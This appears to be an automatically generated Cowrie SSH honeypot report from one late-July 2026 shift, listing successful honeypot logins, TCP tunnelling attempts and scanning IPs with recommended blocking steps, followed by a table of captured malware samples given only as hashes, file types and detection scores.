- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de3eb357e412

| Field | Detail |
|---|---|
| **Source IP** | `116.7.248[.]50` |
| **First Seen** | 2026-07-29 18:33 |
| **Last Seen** | 2026-07-29 18:33 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 18:33:03` | `cowrie.session.connect` |
| `2026-07-29 18:33:04` | `cowrie.client.version` |
| `2026-07-29 18:33:04` | `cowrie.client.kex` |
| `2026-07-29 18:33:07` | `cowrie.login.success` |
| `2026-07-29 18:33:08` | `cowrie.direct-tcpip.request` |
| `2026-07-29 18:33:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.7.248[.]50` to AbuseIPDB if not already reported
- [ ] Block `116.7.248[.]50` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-343d21b54b9a

| Field | Detail |
|---|---|
| **Source IP** | `222.99.31[.]54` |
| **First Seen** | 2026-07-29 18:33 |
| **Last Seen** | 2026-07-29 18:34 |
| **Session Duration** | 34s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 18:33:30` | `cowrie.session.connect` |
| `2026-07-29 18:33:31` | `cowrie.login.success` |
| `2026-07-29 18:33:31` | `cowrie.session.params` |
| `2026-07-29 18:33:32` | `cowrie.command.input` |
| `2026-07-29 18:33:32` | `cowrie.command.failed` |
| `2026-07-29 18:33:32` | `cowrie.command.input` |
| `2026-07-29 18:33:32` | `cowrie.command.failed` |
| `2026-07-29 18:33:32` | `cowrie.command.input` |
| `2026-07-29 18:33:32` | `cowrie.command.failed` |
| `2026-07-29 18:33:33` | `cowrie.command.input` |
| `2026-07-29 18:33:33` | `cowrie.command.failed` |
| `2026-07-29 18:33:33` | `cowrie.command.input` |
| `2026-07-29 18:33:33` | `cowrie.command.input` |
| `2026-07-29 18:33:33` | `cowrie.command.failed` |
| `2026-07-29 18:33:33` | `cowrie.command.failed` |
| `2026-07-29 18:34:04` | `cowrie.log.closed` |
| `2026-07-29 18:34:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.99.31[.]54` to AbuseIPDB if not already reported
- [ ] Block `222.99.31[.]54` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b21cfa2b068

| Field | Detail |
|---|---|
| **Source IP** | `222.99.31[.]54` |
| **First Seen** | 2026-07-29 18:34 |
| **Last Seen** | 2026-07-29 18:34 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 18:34:05` | `cowrie.session.connect` |
| `2026-07-29 18:34:05` | `cowrie.login.success` |
| `2026-07-29 18:34:06` | `cowrie.session.params` |
| `2026-07-29 18:34:06` | `cowrie.command.input` |
| `2026-07-29 18:34:06` | `cowrie.command.failed` |
| `2026-07-29 18:34:07` | `cowrie.command.input` |
| `2026-07-29 18:34:07` | `cowrie.command.failed` |
| `2026-07-29 18:34:07` | `cowrie.command.input` |
| `2026-07-29 18:34:07` | `cowrie.command.failed` |
| `2026-07-29 18:34:08` | `cowrie.command.input` |
| `2026-07-29 18:34:08` | `cowrie.command.failed` |
| `2026-07-29 18:34:08` | `cowrie.command.input` |
| `2026-07-29 18:34:08` | `cowrie.command.input` |
| `2026-07-29 18:34:08` | `cowrie.command.failed` |
| `2026-07-29 18:34:08` | `cowrie.command.failed` |
| `2026-07-29 18:34:38` | `cowrie.log.closed` |
| `2026-07-29 18:34:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.99.31[.]54` to AbuseIPDB if not already reported
- [ ] Block `222.99.31[.]54` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e77a8ac2259

| Field | Detail |
|---|---|
| **Source IP** | `222.99.31[.]54` |
| **First Seen** | 2026-07-29 18:34 |
| **Last Seen** | 2026-07-29 18:35 |
| **Session Duration** | 33s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 18:34:39` | `cowrie.session.connect` |
| `2026-07-29 18:34:39` | `cowrie.login.success` |
| `2026-07-29 18:34:40` | `cowrie.login.success` |
| `2026-07-29 18:34:41` | `cowrie.session.params` |
| `2026-07-29 18:34:41` | `cowrie.command.input` |
| `2026-07-29 18:34:41` | `cowrie.command.failed` |
| `2026-07-29 18:34:42` | `cowrie.command.input` |
| `2026-07-29 18:34:42` | `cowrie.command.failed` |
| `2026-07-29 18:34:42` | `cowrie.command.input` |
| `2026-07-29 18:34:42` | `cowrie.command.input` |
| `2026-07-29 18:34:42` | `cowrie.command.failed` |
| `2026-07-29 18:34:42` | `cowrie.command.failed` |
| `2026-07-29 18:35:12` | `cowrie.log.closed` |
| `2026-07-29 18:35:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.99.31[.]54` to AbuseIPDB if not already reported
- [ ] Block `222.99.31[.]54` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6dccdff8a00f

| Field | Detail |
|---|---|
| **Source IP** | `222.99.31[.]54` |
| **First Seen** | 2026-07-29 18:35 |
| **Last Seen** | 2026-07-29 18:35 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 18:35:13` | `cowrie.session.connect` |
| `2026-07-29 18:35:13` | `cowrie.login.success` |
| `2026-07-29 18:35:14` | `cowrie.session.params` |
| `2026-07-29 18:35:14` | `cowrie.command.input` |
| `2026-07-29 18:35:14` | `cowrie.command.failed` |
| `2026-07-29 18:35:15` | `cowrie.command.input` |
| `2026-07-29 18:35:15` | `cowrie.command.failed` |
| `2026-07-29 18:35:15` | `cowrie.command.input` |
| `2026-07-29 18:35:15` | `cowrie.command.failed` |
| `2026-07-29 18:35:16` | `cowrie.command.input` |
| `2026-07-29 18:35:16` | `cowrie.command.failed` |
| `2026-07-29 18:35:16` | `cowrie.command.input` |
| `2026-07-29 18:35:16` | `cowrie.command.input` |
| `2026-07-29 18:35:16` | `cowrie.command.failed` |
| `2026-07-29 18:35:16` | `cowrie.command.failed` |
| `2026-07-29 18:35:46` | `cowrie.log.closed` |
| `2026-07-29 18:35:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.99.31[.]54` to AbuseIPDB if not already reported
- [ ] Block `222.99.31[.]54` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ddd51e17012a

| Field | Detail |
|---|---|
| **Source IP** | `222.99.31[.]54` |
| **First Seen** | 2026-07-29 18:35 |
| **Last Seen** | 2026-07-29 18:36 |
| **Session Duration** | 33s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 18:35:47` | `cowrie.session.connect` |
| `2026-07-29 18:35:47` | `cowrie.login.success` |
| `2026-07-29 18:35:48` | `cowrie.login.success` |
| `2026-07-29 18:35:49` | `cowrie.session.params` |
| `2026-07-29 18:35:49` | `cowrie.command.input` |
| `2026-07-29 18:35:49` | `cowrie.command.failed` |
| `2026-07-29 18:35:50` | `cowrie.command.input` |
| `2026-07-29 18:35:50` | `cowrie.command.failed` |
| `2026-07-29 18:35:50` | `cowrie.command.input` |
| `2026-07-29 18:35:50` | `cowrie.command.input` |
| `2026-07-29 18:35:50` | `cowrie.command.failed` |
| `2026-07-29 18:35:50` | `cowrie.command.failed` |
| `2026-07-29 18:36:20` | `cowrie.log.closed` |
| `2026-07-29 18:36:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.99.31[.]54` to AbuseIPDB if not already reported
- [ ] Block `222.99.31[.]54` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51e1a0be1b7c

| Field | Detail |
|---|---|
| **Source IP** | `222.99.31[.]54` |
| **First Seen** | 2026-07-29 18:36 |
| **Last Seen** | 2026-07-29 18:36 |
| **Session Duration** | 33s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 18:36:21` | `cowrie.session.connect` |
| `2026-07-29 18:36:21` | `cowrie.login.success` |
| `2026-07-29 18:36:22` | `cowrie.login.success` |
| `2026-07-29 18:36:23` | `cowrie.session.params` |
| `2026-07-29 18:36:23` | `cowrie.command.input` |
| `2026-07-29 18:36:23` | `cowrie.command.failed` |
| `2026-07-29 18:36:24` | `cowrie.command.input` |
| `2026-07-29 18:36:24` | `cowrie.command.failed` |
| `2026-07-29 18:36:24` | `cowrie.command.input` |
| `2026-07-29 18:36:24` | `cowrie.command.input` |
| `2026-07-29 18:36:24` | `cowrie.command.failed` |
| `2026-07-29 18:36:24` | `cowrie.command.failed` |
| `2026-07-29 18:36:54` | `cowrie.log.closed` |
| `2026-07-29 18:36:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.99.31[.]54` to AbuseIPDB if not already reported
- [ ] Block `222.99.31[.]54` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc4c26f93634

| Field | Detail |
|---|---|
| **Source IP** | `222.99.31[.]54` |
| **First Seen** | 2026-07-29 18:36 |
| **Last Seen** | 2026-07-29 18:37 |
| **Session Duration** | 33s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 18:36:55` | `cowrie.session.connect` |
| `2026-07-29 18:36:55` | `cowrie.login.success` |
| `2026-07-29 18:36:56` | `cowrie.login.success` |
| `2026-07-29 18:36:57` | `cowrie.session.params` |
| `2026-07-29 18:36:57` | `cowrie.command.input` |
| `2026-07-29 18:36:57` | `cowrie.command.failed` |
| `2026-07-29 18:36:58` | `cowrie.command.input` |
| `2026-07-29 18:36:58` | `cowrie.command.failed` |
| `2026-07-29 18:36:58` | `cowrie.command.input` |
| `2026-07-29 18:36:58` | `cowrie.command.input` |
| `2026-07-29 18:36:58` | `cowrie.command.failed` |
| `2026-07-29 18:36:58` | `cowrie.command.failed` |
| `2026-07-29 18:37:28` | `cowrie.log.closed` |
| `2026-07-29 18:37:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.99.31[.]54` to AbuseIPDB if not already reported
- [ ] Block `222.99.31[.]54` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7343209b1a9

| Field | Detail |
|---|---|
| **Source IP** | `222.99.31[.]54` |
| **First Seen** | 2026-07-29 18:37 |
| **Last Seen** | 2026-07-29 18:38 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 18:37:29` | `cowrie.session.connect` |
| `2026-07-29 18:37:29` | `cowrie.login.success` |
| `2026-07-29 18:37:30` | `cowrie.session.params` |
| `2026-07-29 18:37:30` | `cowrie.command.input` |
| `2026-07-29 18:37:30` | `cowrie.command.failed` |
| `2026-07-29 18:37:31` | `cowrie.command.input` |
| `2026-07-29 18:37:31` | `cowrie.command.failed` |
| `2026-07-29 18:37:31` | `cowrie.command.input` |
| `2026-07-29 18:37:31` | `cowrie.command.failed` |
| `2026-07-29 18:37:32` | `cowrie.command.input` |
| `2026-07-29 18:37:32` | `cowrie.command.failed` |
| `2026-07-29 18:37:32` | `cowrie.command.input` |
| `2026-07-29 18:37:32` | `cowrie.command.input` |
| `2026-07-29 18:37:32` | `cowrie.command.failed` |
| `2026-07-29 18:37:32` | `cowrie.command.failed` |
| `2026-07-29 18:38:02` | `cowrie.log.closed` |
| `2026-07-29 18:38:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.99.31[.]54` to AbuseIPDB if not already reported
- [ ] Block `222.99.31[.]54` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4522ae9c257

| Field | Detail |
|---|---|
| **Source IP** | `222.99.31[.]54` |
| **First Seen** | 2026-07-29 18:38 |
| **Last Seen** | 2026-07-29 18:38 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 18:38:03` | `cowrie.session.connect` |
| `2026-07-29 18:38:03` | `cowrie.login.success` |
| `2026-07-29 18:38:04` | `cowrie.session.params` |
| `2026-07-29 18:38:04` | `cowrie.command.input` |
| `2026-07-29 18:38:04` | `cowrie.command.failed` |
| `2026-07-29 18:38:05` | `cowrie.command.input` |
| `2026-07-29 18:38:05` | `cowrie.command.failed` |
| `2026-07-29 18:38:05` | `cowrie.command.input` |
| `2026-07-29 18:38:05` | `cowrie.command.failed` |
| `2026-07-29 18:38:06` | `cowrie.command.input` |
| `2026-07-29 18:38:06` | `cowrie.command.failed` |
| `2026-07-29 18:38:06` | `cowrie.command.input` |
| `2026-07-29 18:38:06` | `cowrie.command.input` |
| `2026-07-29 18:38:06` | `cowrie.command.failed` |
| `2026-07-29 18:38:06` | `cowrie.command.failed` |
| `2026-07-29 18:38:36` | `cowrie.log.closed` |
| `2026-07-29 18:38:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.99.31[.]54` to AbuseIPDB if not already reported
- [ ] Block `222.99.31[.]54` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb70e15b19ff

| Field | Detail |
|---|---|
| **Source IP** | `59.46.182[.]10` |
| **First Seen** | 2026-07-29 18:38 |
| **Last Seen** | 2026-07-29 18:38 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 18:38:14` | `cowrie.session.connect` |
| `2026-07-29 18:38:15` | `cowrie.client.version` |
| `2026-07-29 18:38:15` | `cowrie.client.kex` |
| `2026-07-29 18:38:17` | `cowrie.login.success` |
| `2026-07-29 18:38:18` | `cowrie.direct-tcpip.request` |
| `2026-07-29 18:38:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.46.182[.]10` to AbuseIPDB if not already reported
- [ ] Block `59.46.182[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59eca86074a9

| Field | Detail |
|---|---|
| **Source IP** | `222.99.31[.]54` |
| **First Seen** | 2026-07-29 18:38 |
| **Last Seen** | 2026-07-29 18:39 |
| **Session Duration** | 33s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 18:38:37` | `cowrie.session.connect` |
| `2026-07-29 18:38:37` | `cowrie.login.success` |
| `2026-07-29 18:38:38` | `cowrie.login.success` |
| `2026-07-29 18:38:39` | `cowrie.session.params` |
| `2026-07-29 18:38:39` | `cowrie.command.input` |
| `2026-07-29 18:38:39` | `cowrie.command.failed` |
| `2026-07-29 18:38:40` | `cowrie.command.input` |
| `2026-07-29 18:38:40` | `cowrie.command.failed` |
| `2026-07-29 18:38:40` | `cowrie.command.input` |
| `2026-07-29 18:38:40` | `cowrie.command.input` |
| `2026-07-29 18:38:40` | `cowrie.command.failed` |
| `2026-07-29 18:38:40` | `cowrie.command.failed` |
| `2026-07-29 18:39:10` | `cowrie.log.closed` |
| `2026-07-29 18:39:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.99.31[.]54` to AbuseIPDB if not already reported
- [ ] Block `222.99.31[.]54` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87a80e36b571

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-29 18:39 |
| **Last Seen** | 2026-07-29 18:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 18:39:25` | `cowrie.session.connect` |
| `2026-07-29 18:39:25` | `cowrie.client.version` |
| `2026-07-29 18:39:25` | `cowrie.client.kex` |
| `2026-07-29 18:39:25` | `cowrie.login.success` |
| `2026-07-29 18:39:25` | `cowrie.direct-tcpip.request` |
| `2026-07-29 18:39:25` | `cowrie.direct-tcpip.data` |
| `2026-07-29 18:39:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d27c2bc5e814

| Field | Detail |
|---|---|
| **Source IP** | `119.200.229[.]33` |
| **First Seen** | 2026-07-29 18:40 |
| **Last Seen** | 2026-07-29 18:41 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 18:40:55` | `cowrie.session.connect` |
| `2026-07-29 18:40:56` | `cowrie.client.version` |
| `2026-07-29 18:40:56` | `cowrie.client.kex` |
| `2026-07-29 18:40:58` | `cowrie.login.success` |
| `2026-07-29 18:40:59` | `cowrie.direct-tcpip.request` |
| `2026-07-29 18:41:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.200.229[.]33` to AbuseIPDB if not already reported
- [ ] Block `119.200.229[.]33` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `91.233.83[.]203` | **32** | 2026-07-29 16:56 | 2026-07-29 18:47 | 31m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **5** | 2026-07-29 17:07 | 2026-07-29 18:49 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]176` | **5** | 2026-07-29 18:51 | 2026-07-29 18:52 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]167` | **3** | 2026-07-29 17:01 | 2026-07-29 17:01 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]125` | **3** | 2026-07-29 18:52 | 2026-07-29 18:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]83` | **3** | 2026-07-29 18:52 | 2026-07-29 18:52 | 0m | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]123` | **3** | 2026-07-29 18:41 | 2026-07-29 18:41 | 0m | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]124` | **3** | 2026-07-29 17:27 | 2026-07-29 17:27 | 0m | 0 | `T1592` | 🟢 LOW |
| `171.243.150[.]132` | **2** | 2026-07-29 17:29 | 2026-07-29 17:32 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `34.122.244[.]225` | **2** | 2026-07-29 18:17 | 2026-07-29 18:18 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]192` | **2** | 2026-07-29 17:57 | 2026-07-29 17:57 | 0m | 0 | `T1592` | 🟢 LOW |
| `111.39.167[.]59` | 1 | 2026-07-29 17:22 | 2026-07-29 17:22 | 0s | 0 | `T1592` | 🟢 LOW |
| `111.70.23[.]222` | 1 | 2026-07-29 17:18 | 2026-07-29 17:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `117.158.160[.]42` | 1 | 2026-07-29 18:03 | 2026-07-29 18:03 | 16s | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | 1 | 2026-07-29 18:53 | 2026-07-29 18:54 | 44s | 0 | `T1592` | 🟢 LOW |
| `14.103.115[.]143` | 1 | 2026-07-29 17:13 | 2026-07-29 17:15 | 120s | 0 | `T1592` | 🟢 LOW |
| `185.107.80[.]93` | 1 | 2026-07-29 17:38 | 2026-07-29 17:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `27.79.2[.]68` | 1 | 2026-07-29 18:08 | 2026-07-29 18:09 | 58s | 0 | `T1592` | 🟢 LOW |
| `45.198.224[.]26` | 1 | 2026-07-29 17:45 | 2026-07-29 17:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.77.61[.]56` | 1 | 2026-07-29 17:10 | 2026-07-29 17:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `60.175.91[.]53` | 1 | 2026-07-29 18:53 | 2026-07-29 18:54 | 13s | 0 | `T1592` | 🟢 LOW |
| `90.230.226[.]175` | 1 | 2026-07-29 17:22 | 2026-07-29 17:24 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/73 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 82/100 | 🔴 HIGH | **32/74** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 43/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/74** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
